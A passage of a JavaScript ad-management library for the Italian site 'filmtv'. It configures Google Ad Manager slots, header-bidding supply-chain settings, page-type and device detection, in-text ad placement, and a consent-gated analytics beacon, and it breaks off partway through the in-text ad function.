/**
 * @preserve Copyright 2020-2023 AdPlay Srl
 * All rights reserved
 */

/**
 * First define googletag if not already defined
 */
window.googletag = window.googletag || {};
window.googletag.cmd = window.googletag.cmd || [];

/**
 * Set up configuration parameters respecting any parameters coming from the calling page
 */
window._gmp = function (config) {
  var defaultConfig = {
    section: typeof filmtv_section !== 'undefined' ? filmtv_section : '',
    customTargeting: null,
    consentState: null,
    // by default null, wait for consent
    initRun: false,
    googleConsent: null,
    googleLimitedConsent: null,
    runAuctionsImmediately: false,
    consentNeeded: true,
    purposeOneConsent: null,
    apsEnabled: false,
    // pending consent
    ignoreViewability: false,
    apstagPubID: '5055',
    debug: false,
    content_width: 0,
    class: 'gmp',
    gamPrefix: '/22248368690/',
    track: {
      site: 'filmtv',
      pageUrl: document.location.href,
      slots: {}
    },
    schainConfigNodes: [{
      "asi": "adplay.it",
      "sid": "230",
      "hp": 1
    }],
    components: {},
    filters: {
      prebidConfig: []
    },
    cmd: [],
    auctionQueue: [],
    gamRefreshQueue: [],
    userType: null,
    interstitialKeyNameShown: '_gmp_interstitial_shown',
    bidderTimeout: 3000,
    pageTypeConfig: {
      "homepage": {
        "regex": "",
        "css_selector": "",
        "floorAdMob": false,
        "floorAdDsk": false,
        "fakeSkin": false,
        "intextAdSelector": "",
        "repeatingAdSelector": "",
        "interstitial_mob": false,
        "interstitial_dsk": false,
        "audioAd": false,
        "mobileSkin": false,
        "gmSubscribe": false,
        "sitebreaker": false,
        "roadBlock": null,
        "noTrack": false
      },
      "category": {
        "regex": "",
        "css_selector": "",
        "floorAdMob": false,
        "floorAdDsk": false,
        "fakeSkin": false,
        "intextAdSelector": "",
        "repeatingAdSelector": "",
        "interstitial_mob": false,
        "interstitial_dsk": false,
        "audioAd": false,
        "mobileSkin": false,
        "gmSubscribe": false,
        "sitebreaker": false,
        "roadBlock": null,
        "noTrack": false
      },
      "free article": {
        "regex": "",
        "css_selector": "",
        "floorAdMob": false,
        "floorAdDsk": false,
        "fakeSkin": false,
        "intextAdSelector": "",
        "repeatingAdSelector": "",
        "interstitial_mob": false,
        "interstitial_dsk": false,
        "audioAd": false,
        "mobileSkin": false,
        "gmSubscribe": false,
        "sitebreaker": false,
        "roadBlock": null,
        "noTrack": false
      }
    },
    trackChangedSinceSent: false,
    slotCounter: function () {
      // returns a progressive number for slots in page
      var count = 0;
      function countUp() {
        count++;
        return count;
      }
      return countUp;
    }(),
    consentData: {},
    noTrack: false,
    getSlotPos: function () {
      // returns a progressive number for slots sharing the same ad unit
      var slotPosMap = {};
      function slotPos(adUnitPath) {
        if (!(adUnitPath in slotPosMap)) {
          slotPosMap[adUnitPath] = 0;
        }
        slotPosMap[adUnitPath] += 1;
        return slotPosMap[adUnitPath];
      }
      return slotPos;
    }()
  };
  for (var prop in defaultConfig) {
    // set default properties for config object where not present
    if (!config.hasOwnProperty(prop)) {
      config[prop] = defaultConfig[prop];
    }
  }

  /**
   * If the browser has the performance object we track timing metrics
   */
  if ("performance" in window) {
    var navigationDateNow = Date.now();
    var navigationStart = 0;
    if ('timeOrigin' in performance) {
      navigationStart = performance.timeOrigin;
    } else {
      if ('timing' in performance && performance.timing.navigationStart) {
        navigationStart = performance.timing.navigationStart;
      }
    }
    if (navigationDateNow - navigationStart > 10000) {
      navigationStart = navigationDateNow;
    }
    config.track.navigationStart = Math.round(navigationStart);
    window.addEventListener('gaminit', function () {
      window._gmp.track.advStart = Math.round(performance.now());
    });
  } else {
    config.track.navigationStart = Date.now();
  }
  if (!config.hasOwnProperty('customBidderConfig')) {
    config.customBidderConfig = [{
      'bidders': ['adf', 'connectad', 'openx'],
      'config': {
        'schain': {
          'validation': 'relaxed',
          'config': {
            'ver': '1.0',
            'complete': 1,
            'nodes': [{
              'asi': 'takerate.com',
              'sid': 'w123963',
              'hp': 1
            }]
          }
        }
      }
    }, {
      'bidders': ['quantum_x', 'quantum_i'],
      'config': {
        'schain': {
          'validation': 'relaxed',
          'config': {
            'ver': '1.0',
            'complete': 1,
            'nodes': [{
              'asi': 'quantum-advertising.com',
              'sid': '4080',
              'hp': 1
            }]
          }
        }
      }
    }];
  }

  /**
   * Check what kind of page we are in, if not provided - set default pagetype if given an unkown pagetype
   */
  if (!config.hasOwnProperty('pageType')) {
    config.pageType = 'homepage';
    for (var pageType in config.pageTypeConfig) {
      if (config.pageTypeConfig[pageType].regex && document.location.pathname.match(config.pageTypeConfig[pageType].regex) || config.pageTypeConfig[pageType].css_selector && document.querySelector(config.pageTypeConfig[pageType].css_selector)) {
        config.pageType = pageType;
        break;
      }
    }
  } else {
    // Catch cases where we're given the wrong pagetypes
    if (!(config.pageType in config.pageTypeConfig)) {
      config.pageType = 'homepage';
    }
  }

  /**
   * Check if we're on mobile, if not provided
   */
  if (!config.hasOwnProperty('mobile')) {
    config.mobile = function (a) {
      if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) {
        return true;
      } else {
        return false;
      }
    }(navigator.userAgent || navigator.vendor || window.opera);
  }
  config.track.device = config.mobile ? 'mobile' : 'desktop';

  /**
   * Check if we should respect any roadblocks while calling the adserver
   */
  if (!config.hasOwnProperty('roadblocksMissing')) {
    config.roadblocksMissing = [];
    try {
      if (config.pageType in config.pageTypeConfig && config.pageTypeConfig[config.pageType].roadBlock && (window._gmp.mobile && config.pageTypeConfig[config.pageType].roadBlock.devices.indexOf('mobile') != -1 || !window._gmp.mobile && config.pageTypeConfig[config.pageType].roadBlock.devices.indexOf('desktop') != -1)) {
        config.roadblocksMissing = config.pageTypeConfig[config.pageType].roadBlock.slots;
        if (config.hasOwnProperty('disabledSlots')) {
          config.roadblocksMissing = config.roadblocksMissing.filter(value => !config.disabledSlots.includes(value));
        }
      }
    } catch (err) {
      window._gmp.debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while setting up roadblocks for ", config.pageType, ":", err);
    }
  }

  /**
   * Use the targeting variable to pass additional custom params for use in video adv
   */
  if (!config.hasOwnProperty('additional_cust_params')) {
    config.additional_cust_params = 'filmtv_section%3D' + config.section;
  }
  config.log = function () {
    if (!window._gmp.debug) {
      return;
    }
    console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", Array.prototype.slice.call(arguments, 0).join(','));
  };
  config.error = function () {
    console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", Array.prototype.slice.call(arguments, 0).join(','));
  };

  /**
   * Ovveride the push method for the auctionQueue array that we can call all auctions at once when initial ad slots are defined in page
   */
  config.auctionQueue.push = function (slot) {
    var res;
    if (window._gmp.runAuctionsImmediately) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "will run auctions for:", slot);
      window._gmp.runAuctions([slot]);
    } else {
      // enqueue this slot for auctioning
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "enqueuing auction for:", slot);
      res = Array.prototype.push.apply(this, arguments);
    }
    return res;
  };

  /**
   * Flush auction queue - the window._gmp.runAuctions function must run APS + prebid auction
   * and enqueue a googletag.pubads.refresh() call when slot is viewable (or immediately if the slot has a data-immediate attribute)
   */
  config.auctionQueue.flush = function () {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "flushing auction queue");
    window._gmp.runAuctionsImmediately = true;
    window._gmp.runAuctions(window._gmp.auctionQueue);
    window._gmp.auctionQueue.splice(0, window._gmp.auctionQueue.length);
  };

  /**
   * Ovveride the push method for the gamRefreshQueue array that we can refresh at once when all roadblocks are ready to be served
   */
  config.gamRefreshQueue.push = function (gamSlot) {
    var res;
    if (window._gmp.roadblocksMissing.length == 0) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no roadblocks missing - refreshing now:", gamSlot.getSlotElementId());
      googletag.pubads().refresh([gamSlot]);
    } else {
      // roadblocks missing - check if this is the last one missing
      window._gmp.roadblocksMissing = window._gmp.roadblocksMissing.filter(function (item) {
        if (window._gmp.userType == 'subscriber') {
          // TODO: extend window._gmp.isSlotToBeShown
          window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "check roadblocks for subscriber:", item);
          if (!window._gmp.slotMap['gmp-skin'].hasOwnProperty('showToSubscribers')) {
            return false;
          }
        }
        return item !== gamSlot.getSlotElementId();
      });
      // enqueue this slot
      res = Array.prototype.push.apply(this, arguments);
      if (window._gmp.roadblocksMissing.length == 0) {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "last missing roadblock - refresh & drain queue:", gamSlot.getSlotElementId());
        // this was the last one - refresh now and drain the queue
        // Array.prototype.push.apply(this, arguments);
        googletag.pubads().refresh(window._gmp.gamRefreshQueue);
        window._gmp.gamRefreshQueue.splice(0, window._gmp.gamRefreshQueue.length);
      } else {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "roadblocks missing:", window._gmp.roadblocksMissing, "- enqueued refresh for:", gamSlot.getSlotElementId());
      }
    }
    return res;
  };
  function uuidGenerator() {
    var d = new Date().getTime(); //Timestamp
    var d2 = performance && performance.now && performance.now() * 1000 || 0; //Time in microseconds since page-load or 0 if unsupported
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = Math.random() * 16; //random number between 0 and 16
      if (d > 0) {
        //Use timestamp until depleted
        r = (d + r) % 16 | 0;
        d = Math.floor(d / 16);
      } else {
        //Use microseconds since page-load if supported
        r = (d2 + r) % 16 | 0;
        d2 = Math.floor(d2 / 16);
      }
      return (c === 'x' ? r : r & 0x3 | 0x8).toString(16);
    });
  }

  /**
   * Get or set uid and pageid
   */
  if (!config.track.hasOwnProperty('uid')) {
    config.track.uid = localStorage.getItem(config.class + "-uid");
    if (!config.track.uid) {
      config.track.uid = uuidGenerator();
      document.addEventListener('consentGranted', function () {
        localStorage.setItem(config.class + "-uid", config.track.uid);
      });
    }
  }
  if (!config.track.hasOwnProperty('pageid')) {
    config.track.pageid = uuidGenerator();
  }

  /**
   * mark config changed
   */
  config.trackChangedSinceSent = true;

  /**
   * Check incoming parameters to see if we must enable debug or custom params
   * Enable debugging with ?gmp-debug
   * Enable custom tagging values with ?gmp-cust-params
   */
  if (typeof URL === 'function') {
    var searchParams = new URL(document.location).searchParams;
    var customParams = searchParams.get('gmp-cust-params');
    if (customParams) {
      config.customTargeting = {};
      try {
        new URLSearchParams(customParams).forEach(function (v, k) {
          config.customTargeting[k] = v;
        });
      } catch (err) {
        console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error setting up defined targeting variable:", err);
      }
    }
    if (searchParams.get('gmp-debug') !== null) {
      config.debug = true;
    }
  } else {
    if (window.location.search.indexOf('gmp-debug') != -1) {
      config.debug = true;
    }
  }

  // `{leading: false}`. To disable execution on the trailing edge, ditto.
  config.throttle = function (callback, limit) {
    var waiting = false; // Initially, we're not waiting
    return function () {
      // We return a throttled function
      if (!waiting) {
        // If we're not waiting
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "calling throttled function");
        callback.apply(this, arguments); // Execute users function
        waiting = true; // Prevent future invocations
        setTimeout(function () {
          // After a period of time
          waiting = false; // And allow future invocations
        }, limit);
      } else {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "function is being throttled");
      }
    };
  };
  if (!config.hasOwnProperty('reloadTimeout')) {
    config.reloadTimeout = 3000;
  }
  return config;
}(window._gmp || {});

/**
 * send tracking info
 *
 * @todo maybe send data with xhr as fallback
 */
window._gmp.sendBeacon = function () {
  if (!navigator.sendBeacon) {
    return;
  }
  if (window._gmp.consentNeeded && !window._gmp.consentState) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no consent - not sending beacon");
    return;
  }
  if (window._gmp.noTrack) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "page marked as noTrack - not sending beacon");
    return;
  }
  if (!window._gmp.trackChangedSinceSent) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "not sending beacon for unchanged track info");
    return;
  }
  // Prepare tracking blob
  var track = window._gmp.track;
  ['pageType', 'mobile', 'section'].map(function (item) {
    if (!track.hasOwnProperty(item)) {
      track[item] = window._gmp[item];
    }
  });
  var blob = new Blob([JSON.stringify(track)], {
    type: 'application/json; charset=UTF-8'
  });
  Object.keys(track.slots).forEach(function (key) {
    if (track.slots[key].state == 'rendered' && !('alreadySent' in track.slots[key])) {
      track.slots[key].alreadySent = true;
    }
  });

  // reset
  window._gmp.trackChangedSinceSent = false;

  // Send tracking blob
  navigator.sendBeacon('https://stats.adplay.it/stats', blob);
};
window.addEventListener('beforeunload', function () {
  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "sending beacon in beforeunload");
  window._gmp.sendBeacon();
}, false);
document.addEventListener("visibilitychange", function () {
  if (document.visibilityState === 'hidden') {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "sending beacon in visibilitychange => hidden");
    window._gmp.sendBeacon();
  }
});
window._gmp.getShownInfo = function (keyName) {
  var nowDate = new Date();
  var nowSeconds = Math.floor(nowDate.getTime() / 1000);
  var oneHourAgoSeconds = nowSeconds - 3600;
  var oneDayAgoSeconds = nowSeconds - 86400;
  var shown = JSON.parse(localStorage.getItem(keyName));
  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "shown info for", keyName, ":", shown);
  if (!Array.isArray(shown)) {
    shown = [];
  }
  var shownByInterval = shown.map(v => {
    return {
      hour: v.when > oneHourAgoSeconds,
      day: v.when > oneDayAgoSeconds
    };
  }).reduce((acc, curr) => {
    return {
      hour: acc.hour + curr.hour,
      day: acc.day + curr.day
    };
  }, {
    hour: 0,
    day: 0
  });
  return {
    raw: shown,
    byInterval: shownByInterval
  };
};
window._gmp.updateShown = function (keyName, shown) {
  var nowDate = new Date();
  var nowSeconds = Math.floor(nowDate.getTime() / 1000);
  var oneDayAgoSeconds = nowSeconds - 86400;
  shown.raw.push({
    when: nowSeconds
  });

  // Keep only those shown in the last day
  shown.raw = shown.raw.filter(s => s.when > oneDayAgoSeconds);
  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "updating shown info for", keyName, ":", shown.raw);
  localStorage.setItem(keyName, JSON.stringify(shown.raw));
};

/**
 * Set html content of an element evaluating any script nodes inside it
 * @param {Element} elm
 * @param {String} html
 */
window._gmp.setInnerHTML = function (elm, html) {
  elm.innerHTML = html;
  var scripts = elm.getElementsByTagName("script");
  // If we don't clone the results then "scripts"
  // will actually update live as we insert the new
  // tags, and we'll get caught in an endless loop
  var scriptsClone = [];
  for (var i = 0; i < scripts.length; i++) {
    scriptsClone.push(scripts[i]);
  }
  for (var i = 0; i < scriptsClone.length; i++) {
    var currentScript = scriptsClone[i];
    var s = document.createElement("script");
    // Copy all the attributes from the original script
    for (var j = 0; j < currentScript.attributes.length; j++) {
      var a = currentScript.attributes[j];
      s.setAttribute(a.name, a.value);
    }
    s.appendChild(document.createTextNode(currentScript.innerHTML));
    currentScript.parentNode.replaceChild(s, currentScript);
  }
};

/**
 * display a fallback unit
 */
window._gmp.displayFallbackSlot = function (slot_id, fallbackContainerId) {
  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up div for fallback slot:", slot_id);
  if (!(slot_id in window._gmp.slotMap)) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "slot not found for:", slot_id);
    return;
  }
  var fallbackContainer = document.getElementById(fallbackContainerId);
  if (!fallbackContainer) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "container not found for:", slot_id);
    return;
  }
  var slot = window._gmp.slotMap[slot_id];
  var fallbackAd = document.createElement('div');
  fallbackAd.id = slot_id;
  fallbackAd.className = window._gmp.class;
  fallbackAd.dataset.adUnit = slot.unit;
  fallbackAd.dataset.gamSizes = JSON.stringify(slot.gamSizes);
  fallbackAd.dataset.apsSizes = JSON.stringify(slot.apsSizes);
  fallbackAd.dataset.pbSizes = JSON.stringify(slot.pbSizes);
  fallbackContainer.appendChild(fallbackAd);
  window._gmp.setupSlot(fallbackAd, true);
};

/**
 * Insert a new slot in page, given the adunit, the selector and the position relative to the selector
 * @param {string} adUnit the ad unit for this slot
 * @param {string|Element} selector the CSS selector or element for insertion
 * @param {string} position the insertion position relative to the selector (before, after, prepend, append)
 * @param {string} slotId the (optional) id of the slot
 */
window._gmp.insertSlot = function (adUnit, selector, position, slotId) {
  var debug = window._gmp.debug;
  if (!adUnit && !slotId) {
    debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no ad unit or slot id given");
  }
  var slotDiv;
  var alreadyInPage = false;
  if (slotId) {
    slotDiv = document.getElementById(slotId);
  } else {
    slotId = window._gmp.class + '-' + window._gmp.slotCounter();
  }
  if (!slotDiv) {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "going to insert div#" + slotId, "for ad unit", adUnit);
    var slotDiv = document.createElement('div');
    slotDiv.setAttribute('id', slotId); // set id
    slotDiv.setAttribute('class', window._gmp.class + '-dynamic'); // set class
  } else {
    alreadyInPage = true;
  }
  var slotMap = window._gmp.slotMap;
  var unitMap = window._gmp.unitMap;

  // First check if we have an ad slot corresponding to the requested ID
  if (slotMap.hasOwnProperty(slotId)) {
    if (!slotDiv.hasAttribute('data-ad-unit')) {
      slotDiv.setAttribute('data-ad-unit', slotMap[slotId].unit); // set ad unit, giving precedence to the one in slotMap
    }
    if (!slotDiv.hasAttribute('data-gam-sizes')) {
      slotDiv.setAttribute('data-gam-sizes', JSON.stringify(slotMap[slotId].gamSizes)); // set ad unit sizes
    }
    if (!slotDiv.hasAttribute('data-pb-sizes') && 'pbSizes' in slotMap[slotId]) {
      slotDiv.setAttribute('data-pb-sizes', JSON.stringify(slotMap[slotId].pbSizes)); // set prebid sizes
    }
    if (!slotDiv.hasAttribute('data-aps-sizes') && 'apsSizes' in slotMap[slotId]) {
      slotDiv.setAttribute('data-aps-sizes', JSON.stringify(slotMap[slotId].apsSizes)); // set aps sizes
    }
  } else if (unitMap.hasOwnProperty(adUnit)) {
    // do we have this ad unit
    slotDiv.setAttribute('data-ad-unit', adUnit); // set ad unit
    if (!slotDiv.hasAttribute('data-gam-sizes')) {
      slotDiv.setAttribute('data-gam-sizes', JSON.stringify(unitMap[adUnit].gamSizes)); // set ad unit sizes
    }
    if (!slotDiv.hasAttribute('data-pb-sizes') && 'pbSizes' in unitMap[adUnit]) {
      slotDiv.setAttribute('data-pb-sizes', JSON.stringify(unitMap[adUnit].pbSizes)); // set prebid sizes
    }
    if ('apsSizes' in unitMap[adUnit]) {
      slotDiv.setAttribute('data-aps-sizes', JSON.stringify(unitMap[adUnit].apsSizes)); // set aps sizes
    }
  } else {
    // default sizes ?
  }
  if (!alreadyInPage) {
    var slotPosition;
    if (typeof selector == 'string') {
      slotPosition = document.querySelector(selector);
    } else if (selector instanceof Element) {
      slotPosition = selector;
    }
    if (!slotPosition) {
      debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "could not find position for inserting ad slot:", selector);
      return null;
    }
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "inserting", slotId, selector);
    switch (position) {
      case "before":
        slotPosition.parentNode.insertBefore(slotDiv, slotPosition);
        break;
      case "after":
        slotPosition.parentNode.insertBefore(slotDiv, slotPosition.nextSibling);
        break;
      case "prepend":
        slotPosition.insertBefore(slotDiv, slotPosition.firstChild);
        break;
      case "append":
      default:
        slotPosition.appendChild(slotDiv);
    }
  }
  return slotDiv;
};

/**
 * Set up intext Ads
 *
 * @todo get distances from config
 * @todo get sizes from ad unit
 */
window._gmp.displayIntextAds = function (event, containerSelector, skipRichMedia) {
  var candidates;
  if (!window._gmp.pageTypeConfig[window._gmp.pageType] || !window._gmp.pageTypeConfig[window._gmp.pageType].intextAdSelector) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no selector for intext ads for pagetype", window._gmp.pageType);
    return;
  }
  if (typeof window._gmp.displayIntextAds.counter === 'undefined') {
    window._gmp.displayIntextAds.counter = 1;
  } else {
    window._gmp.displayIntextAds.counter++;
  }
  if (typeof containerSelector == 'undefined' || !containerSelector) {
    containerSelector = window._gmp.pageTypeConfig[window._gmp.pageType].intextAdSelector;
  }
  var container = document.querySelector(containerSelector);
  if (typeof skipRichMedia == 'undefined') {
    skipRichMedia = false;
  }
  var debug = window._gmp.debug;
  var mobile = window._gmp.mobile;
  if (!container) {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no container found for intext:", window._gmp.pageTypeConfig[window._gmp.pageType].intextAdSelector);
    return;
  }
  var previousAdvHeight = 0; // if we use container.offsetTop as previously we will incur in wrong calculations below
  var containerHeight = container.offsetHeight;
  var gamsizes = JSON.stringify([[300, 250], [336, 280], 'fluid']);
  var pbSizes = JSON.stringify([[300, 250], [336, 280]]);
  var adUnit = window._gmp.intextAdUnit;
  if (!adUnit) {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no adunit for intext ads - skipping");
    return;
  }
  var intextSlots = [];
  for (i = 0; i < window._gmp.intextConfig[window._gmp.mobile ? 'mobile' : 'desktop'].slots.length; i++) {
    intextSlots[i] = window._gmp.intextConfig[window._gmp.mobile ? 'mobile' : 'desktop'].slots[i];
  }
  var distances = window._gmp.intextSettings;
  var childSelector = distances.hasOwnProperty('childSelector') ? distances.childSelector : 'p';
  var additionalDistance = 0;
  var afterSelector = null;
  /**
   * use this to mark whether we need to skip candidates until we meet our designated selector
   */
  var skipUntilSelector = false;
  if (distances.hasOwnProperty('afterSelector')) {
    try {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "intext distances apply after selector:", distances.afterSelector);
      afterSelector = document.querySelector(distances.afterSelector);
      additionalDistance = afterSelector.nextElementSibling.offsetTop;
      if (additionalDistance > 0) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "intext additional distance is:", additionalDistance);
        distances.first += additionalDistance;
        skipUntilSelector = true;
      }
    } catch (err) {
      debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "problem setting up distance after selector:", err);
    }
  }
  var maxIntextSlots = distances.hasOwnProperty('maxSlots') && typeof distances.maxSlots === 'number' ? distances.maxSlots : 0;

  /**
   * @todo: setup a mechanism to avoid including certain kinds of elements
   */
  var p_children = document.querySelectorAll(containerSelector + ' > ' + childSelector);
  if (p_children && p_children.length > 0) {
    candidates = Array.from(p_children);
  } else {
    candidates = Array.from(document.querySelectorAll(containerSelector + ' ' + childSelector));
  }

  // there was && !(container.firstChild == candidates[0]))
  if (candidates.length > 0 && candidates[0].offsetParent == container.offsetParent) {
    previousAdvHeight = container.offsetTop;
    containerHeight += container.offsetTop;
    if (additionalDistance) {
      debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "fixing additional distance for first adunit");
      distances.first -= additionalDistance;
    }
  }
  debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "candidates for intext:", candidates);
  var intextSlotQueue = [];
  var richMediaSlotQueue = [];
  debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "intext - before start previousAdvHeight:", previousAdvHeight);

  /**
   * @todo append adv after paragraphs, not before
   */
  candidates.forEach(function (c, idx) {
    if (afterSelector && c.compareDocumentPosition(afterSelector) > 2) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "candidate is iserted before afterSelector", containerHeight, "-c.offsetTop:", c.offsetTop);
      return;
    }
    var pBottom = c.offsetTop + c.offsetHeight;

    // var distance = ( ((intextSlotQueue.length + richMediaSlotQueue.length) == 0) && additionalDistance == 0 ) ? distances.first : distances.next;

    var distance = intextSlotQueue.length + richMediaSlotQueue.length == 0 ? distances.first : distances.next;
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "doing intext candidate - top:", pBottom, "- distance:", distance, "- container height:", containerHeight, "- previousAdvHeight:", previousAdvHeight);

    // if (afterSelector && skipUntilSelector) {
    //     debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skipping intext candidate until designated selector");
    //     if (c == afterSelector) {
    //         debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "met designated selector: ", distances.afterSelector, " - ", c);
    //         previousAdvHeight = c.offsetTop;
    //         skipUntilSelector = false;
    //     }
    //     return;
    // }

    if (containerHeight - pBottom < distances.bottom) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no more intext ads, too near the bottom - containerHeight:", containerHeight, "-c.offsetTop:", c.offsetTop);
      return;
    }
    if (maxIntextSlots && intextSlotQueue.length + richMediaSlotQueue.length >= maxIntextSlots) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no more intexts ads - reached max:", maxIntextSlots);
      return;
    }
    if (pBottom > previousAdvHeight + distance) {
      // c.offsetTop is relative to parent, so we start from zero
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "new intext div -", pBottom);
      var containerDiv = document.createElement('div');
      containerDiv.classList.add("gmp-container-ads");
      containerDiv.style.margin = "0px auto 5px";
      containerDiv.style.maxWidth = "430px";
      containerDiv.style.textAlign = "center";
      containerDiv.style.clear = "both";
      var div, div_id;
      if (!skipRichMedia && intextSlots.length) {
        var intextSlotID = intextSlots.shift();
        if ('unit' in window._gmp.slotMap[intextSlotID]) {
          div = window._gmp.insertSlot(window._gmp.slotMap[intextSlotID].unit, containerDiv, 'append', intextSlotID);
          if (div) {
            if (window._gmp.slotMap[intextSlotID].hasOwnProperty('type')) {
              div.setAttribute('data-type', window._gmp.slotMap[intextSlotID].type); // set type of ad slot
            }
            intextSlotQueue.push(div);
            if (!mobile) {
              div.style.maxHeight = '280px';
              containerDiv.style.maxHeight = "430px";
            }
          } else {
            debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "failed inserting intext ad slot:", intextSlotID);
          }
        } else {
          div = document.createElement('div');
          div.className = window._gmp.class + '-dynamic';
          div.id = intextSlotID;
          containerDiv.appendChild(div);
          richMediaSlotQueue.push(div);
        }
      } else {
        var div_id = window._gmp.class + "-intext-ad-" + window._gmp.displayIntextAds.counter + "-" + pBottom;
        div = window._gmp.insertSlot(adUnit, containerDiv, 'append', div_id);
        if (div) {
          intextSlotQueue.push(div);
          if (!mobile) {
            div.style.maxHeight = '280px';
            containerDiv.style.maxHeight = "430px";
          }
        } else {
